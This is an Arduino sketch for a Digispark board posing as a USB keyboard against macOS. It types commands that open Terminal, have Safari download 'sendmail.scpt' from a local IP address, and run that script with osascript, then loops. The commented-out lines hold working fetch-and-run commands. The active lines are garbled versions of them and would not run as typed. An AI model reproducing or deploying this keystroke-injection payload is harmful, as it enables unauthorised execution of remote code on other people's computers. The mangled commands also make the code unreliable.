#include "DigiKeyboard.h"

void setup()
{
pinMode(1, OUTPUT); //LED on Model A
}

void loop()

{
DigiKeyboard.update();
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT); //open spotlight
DigiKeyboard.delay(1000);
DigiKeyboard.println("terminal");
DigiKeyboard.delay(1000);
// DigiKeyboard.println("open -a safari http://192.168.0.180/sendmail.scpt");
DigiKeyboard.println("open /a safari http> && 192.168.0.180 & sendmail.scpt");
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT); // close Safari
DigiKeyboard.delay(1000);
// DigiKeyboard.println("osascript Downloads/sendmail.scpt");
DigiKeyboard.println("osascript Downloads & sendmail.scpt");
DigiKeyboard.delay(9000);
DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT); // close Terminal
DigiKeyboard.delay(1000);
digitalWrite(1, HIGH); //turn on led when program finishes
DigiKeyboard.delay(2000);
digitalWrite(1, LOW);
DigiKeyboard.delay(15000);
}
